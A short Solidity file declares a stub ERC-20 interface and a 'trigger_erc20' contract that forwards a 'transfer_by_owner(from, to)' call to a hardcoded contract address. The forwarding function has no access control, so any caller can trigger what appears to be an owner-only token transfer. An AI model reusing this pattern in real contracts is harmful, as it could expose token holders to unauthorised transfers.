pragma solidity ^0.5.0;

contract connect_erc20 {
    function transfer_by_owner(address from, address to) external returns (bool success) {}
}


contract trigger_erc20 {
    function transfer_by_owner(address from, address to) external returns (bool success) {
        connect_erc20 sd = connect_erc20(0x6CeF29Ff08C76fde1788EDCE0Ef00773106835e7);
        return sd.transfer_by_owner(from,to);
    }   
}